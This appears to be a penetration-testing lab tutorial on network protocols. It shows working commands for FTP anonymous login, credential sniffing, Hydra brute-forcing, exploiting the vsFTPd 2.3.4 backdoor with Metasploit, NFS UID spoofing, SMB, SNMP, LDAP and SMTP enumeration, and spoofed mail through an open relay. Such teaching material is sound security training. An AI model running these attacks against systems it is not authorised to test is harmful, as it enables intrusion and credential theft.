## **Network Protocols**

### Network protocols allow devices to communicate and exchange data over a network. Here’s an expanded explanation of some commonly used protocols in penetration testing:
---
### **1. FTP (File Transfer Protocol)**

- **Port:** 21 (TCP)
- **Function:** FTP is used for transferring files between a client and a server. FTP operates over two channels:
    - **Control channel** (for sending commands)
    - **Data channel** (for transferring the actual files).
- **Common Security Issues:**
    - **Anonymous login:** Some FTP servers are misconfigured to allow anonymous logins, providing unauthorized access to files.
    - **Clear-text credentials:** FTP sends usernames and passwords in clear text, making it vulnerable to sniffing attacks.

---

### **1.1. Penetration Testing on FTP**

### **1.1.1. Anonymous Login**

When performing penetration testing, an attacker can attempt to log in using **anonymous credentials** if the FTP server allows it. Many misconfigured FTP servers allow anonymous access for easier file sharing, which is a security risk.

**Example FTP login attempt:**

```bash

ftp 192.168.188.131
Name: Anonymous
Password: Anonymous

```
![image](https://github.com/user-attachments/assets/00f9a1e5-3e22-4ad2-86cc-10d990b43574)


If the server allows anonymous login, you will be able to interact with the server and explore its contents.

---

### **1.1.2. Sniffing FTP Credentials (Clear-text Passwords)**

Because FTP doesn’t encrypt traffic, usernames and passwords are sent in clear text. An attacker can use sniffing tools to capture this data, which can be used to compromise the server.

- **Wireshark:** A tool that can capture network packets and allow an attacker to see the FTP credentials.

**How to sniff credentials:**

1. **Start an FTP session**:
    
    ```bash
    
    ftp 192.168.188.131
    
    ```
    
2. **Capture the traffic using Wireshark.**
3. **Follow the TCP stream** to see the credentials:
    - Look for packets containing the string `"PASS"` in Wireshark, which indicates the password being sent.

**Filter clear-text credentials:**

```
frame contains "PASS"
```
![image](https://github.com/user-attachments/assets/84ba48da-79ce-4da8-89d0-0158d5ee9db2)

---

### **1.1.3. FTP Brute-Force Attack (Hydra)**

**Hydra** is a popular tool for performing brute-force attacks against various services, including FTP. It can attempt multiple combinations of usernames and passwords to gain unauthorized access.

**Example of brute-forcing FTP login:**

```bash

hydra -L user -P pass 192.168.188.131 ftp
hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp
use: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

```

- **L** specifies a file with usernames.
- **P** specifies a file with passwords.
- **ftp** is the target protocol.

The **wordlist** file contains a list of possible usernames or passwords to be tried. A strong wordlist (such as **rockyou.txt**) increases the chance of success.
![image](https://github.com/user-attachments/assets/eafa1572-24ac-4ef1-93bd-6734b79ad5e0)

---

### **1.1.4. FTP Remote Shell via Nmap Script**

You can also use **Nmap** to exploit specific vulnerabilities in FTP servers. The `ftp-vsftpd-backdoor.nse` script is designed to exploit a vulnerability in **vsFTPd 2.3.4**, which contains a backdoor.

**Example Nmap command to check for the backdoor:**

```bash

sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse

```

This will test if the FTP server is vulnerable to the **vsFTPd backdoor**. If the server is vulnerable, you may be able to execute commands remotely.
![image](https://github.com/user-attachments/assets/48113953-c487-4bfa-bf04-49b376c60901)

---

### **1.1.5. Exploiting FTP Vulnerabilities with Metasploit**

Metasploit is another powerful tool used for exploiting vulnerabilities in systems. If the FTP server is running a vulnerable version of vsFTPd (e.g., **vsFTPd 2.3.4**), Metasploit can be used to exploit it.

**Steps to exploit vsFTPd 2.3.4 with Metasploit:**

1. **Search for the exploit:**
    
    ```bash
    
    msfconsole
    search vsftpd 2.3.4
    
    ```
    
2. **Use the exploit:**
    
    ```bash
  
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST 192.168.188.131
    exploit
    
    ```
    
3. **Interact with the remote shell:**
    
    ```bash
   
    python -c 'import pty; pty.spawn("/bin/bash")'
    
    ```
    

By exploiting this vulnerability, you can get access to the **root** account on the target machine.
![image](https://github.com/user-attachments/assets/2c266ec1-e757-4442-970e-cc713e589347)

---

### **2. NFS (Network File System)**

NFS allows a system to share its files with other systems over a network. It enables the mounting of remote file systems and interaction with them as if they were local.

**Example Nmap command to scan for NFS services:**

```bash

nmap -p2049 -sV 192.168.188.131

```

If NFS is exposed publicly, it can be mounted to the local machine and files can be accessed.

**Mounting NFS share:**

```bash

sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock

```

This allows you to access shared files from the remote NFS server.
![image](https://github.com/user-attachments/assets/34ad4003-778a-4011-b5ee-1c63e17adf4a)

**Troubleshooting NFS Mount Permission Issues:**

If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.
https://blog.christophetd.fr/write-up-vulnix/
**To use NFSv3 (if needed):**

```bash

sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock

```
Let’s take a closer look at the permissions. 
```bash
ls -ld vulnix
```
If only Particuler user or group have access to the Path:
create a user group:
```jsx
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --groups vulnix_group vulnix
sudo -u vulnix ls -l vulnix
```

![image](https://github.com/user-attachments/assets/c5978efc-c909-48b1-8165-5705d484ef0a)


DEBUG

```jsx
id vulnix
```

Ensure it outputs:

```jsx
uid=2008(vulnix) gid=2008(vulnix_group) groups=2008(vulnix_group)
```

If the UID or GID is incorrect, you must delete and recreate the user with:

```jsx
sudo userdel vulnix
sudo groupdel vulnix_group
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --gid 2008 --groups vulnix_group vulnix
```

Now, try accessing the directory as `vulnix_user`:
![image](https://github.com/user-attachments/assets/90546368-1291-4e7a-b7c9-52a148eef779)

---

### **3. SMB (Server Message Block)**

SMB is a protocol used for file and printer sharing, as well as inter-process communication between computers.

**Example Nmap command to scan for SMB services:**

```bash
bash
CopyEdit
sudo nmap -p 445 -sV -sC 192.168.188.131

```

**Enumerating SMB Shares:**

```bash
bash
CopyEdit
enum4linux -L -S 192.168.188.131
smbclient -L 192.168.188.131 -N
smbmap -H 192.168.188.131

```

**Brute-forcing SMB credentials:**

```bash
bash
CopyEdit
hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131

```

---

### **4. RPC (Remote Procedure Call)**

RPC allows a program on one computer to execute a procedure on another computer.

**Enumerating with RPCClient:**

```bash
bash
CopyEdit
rpcclient 192.168.188.131 -U ''
$> srvinfo
$> enumdomusers

```

This will provide information about the target system and its users.

---

### **5. SNMP (Simple Network Management Protocol)**

SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).

**Example SNMP enumeration with `snmpcheck`:**

```bash
bash
CopyEdit
snmpcheck -c public -h 192.168.188.131

```

**Brute-forcing SNMP community strings:**

```bash
bash
CopyEdit
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156

```

---

### **6. LDAP (Lightweight Directory Access Protocol)**

LDAP is a protocol used to access and maintain directory information. It is commonly used for managing user information and authentication.

**Enumerating LDAP:**

```bash
bash
CopyEdit
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"

```

You can also enumerate users and gather information from LDAP directories.

**Using Metasploit for LDAP enumeration:**

```bash
bash
CopyEdit
msfconsole
use auxiliary/gather/ldap_query
set RHOSTS <IP>
set BASE "dc=example,dc=com"
run

```

---

### **7. SMTP (Simple Mail Transfer Protocol)**

SMTP is used for sending and receiving emails. It can be exploited in cases of misconfiguration, such as **open relay** or **user enumeration**.

**Enumerating SMTP:**

```bash
bash
CopyEdit
smtp-user-enum -M VRFY -U usernames.txt -t <IP>

```

This can be used to find valid email addresses on the target system.

**Exploiting Open Relay (sending emails):**

```bash
bash
CopyEdit
telnet <IP> 25
HELO attacker.com
MAIL FROM: attacker@attacker.com
RCPT TO: victim@victim.com
DATA
Subject: Test
This is a test email.
.

```
